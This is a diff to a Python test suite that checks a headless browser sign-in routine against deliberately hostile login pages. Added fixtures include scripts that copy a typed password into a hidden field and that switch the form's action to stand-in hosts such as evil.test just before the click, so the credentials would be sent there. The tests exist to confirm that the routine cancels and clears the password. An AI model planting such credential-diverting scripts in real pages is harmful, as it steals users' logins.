@@ -69,14 +69,31 @@ PAGES = {
     + '<script>u.addEventListener("input", () => {'
     ' document.querySelector("button").disabled = true; })</script>',
     # an overlay covers the button: the click never lands, the typed password is emptied
-    "/login/covered": FORM.format("<input name=username><input type=password name=p>")
-    + '<div style="position:fixed;inset:0;background:#fff"></div>',
+    "/login/covered": FORM.format(
+        "<input name=username><input type=password name=p id=p><input type=hidden name=c id=c>"
+    )
+    + '<div style="position:fixed;inset:0;background:#fff"></div>'
+    + '<script>p.addEventListener("change", () => { c.value = p.value; })</script>',
     # the button's mousedown (just before the click) switches the hidden account: cancelled
     "/login/picker": FORM.format(
         "<input type=hidden name=username id=h><input name=email><input type=password name=p>"
     )
     + '<script>document.querySelector("button").addEventListener("mousedown",'
     ' () => { h.value = "bob@corp.test"; })</script>',
+    # a 2FA box appears just before the click: cancelled
+    "/login/latecode": FORM.format("<input name=username><input type=password name=p>")
+    + '<script>document.querySelector("button").addEventListener("mousedown", () => {'
+    ' const c = document.createElement("input"); c.autocomplete = "one-time-code";'
+    " document.forms[0].append(c); })</script>",  # after the button: it stays put
+    # the page swaps in a copy of the form (marks and all) under the pointer: cancelled
+    "/login/clone": FORM.format("<input name=username><input type=password name=p>")
+    + '<script>document.querySelector("button").addEventListener("mouseover", () => {'
+    " const f = document.forms[0]; const copy = f.cloneNode(true);"
+    ' copy.action = "https://evil.test/clone"; f.replaceWith(copy); })</script>',
+    # a username step whose destination moves just before the click: cancelled, not counted
+    "/login/userswap": '<form method=post action="/ok"><input name=username><button>Go</button>'
+    "</form><script>document.querySelector('button').addEventListener('mousedown',"
+    " () => { document.forms[0].action = 'https://evil.test/u'; })</script>",
 }
 EXPECTED = {
     "/login/mfa": "challenge",
@@ -97,6 +114,9 @@ EXPECTED = {
     "/login/gate": "stuck",
     "/login/covered": "password",  # counted: the page saw the password
     "/login/picker": "password",
+    "/login/latecode": "password",
+    "/login/clone": "password",
+    "/login/userswap": "changed",
 }
 
 
@@ -156,7 +176,15 @@ def _login(origin: str) -> BrowserLogin:
     return replace(login, password="s3cret pw")
 
 
-UNSENT = ("/login/tenant", "/login/late", "/login/gate", "/login/covered", "/login/picker")
+UNSENT = (
+    "/login/tenant",
+    "/login/late",
+    "/login/gate",
+    "/login/covered",
+    "/login/picker",
+    "/login/latecode",
+    "/login/clone",
+)
 
 
 def test_sign_in_script_on_real_forms(browser: Any) -> None:
@@ -167,11 +195,14 @@ def test_sign_in_script_on_real_forms(browser: Any) -> None:
         try:
             for path, expected in EXPECTED.items():
                 page.goto(origin + path)
-                assert sign_in_headless(page, _login(origin), set(), sync_api.Error) == expected
+                filled: set[str] = set()
+                assert sign_in_headless(page, _login(origin), filled, sync_api.Error) == expected
+                if path == "/login/userswap":
+                    assert filled == set()  # not submitted after all: may be tried again
                 if path in UNSENT:
                     assert page.input_value("input[name=p]") == ""  # never typed, or taken back
                     assert page.locator("[data-codapact-fill]").count() == 0
-                if path == "/login/late":  # the page was told: its copy is gone too
+                if path in ("/login/late", "/login/covered"):  # told: its copy is gone too
                     assert page.input_value("#c") == ""
                 page.wait_for_timeout(200)
             # a window without a password leaves the password box to the person
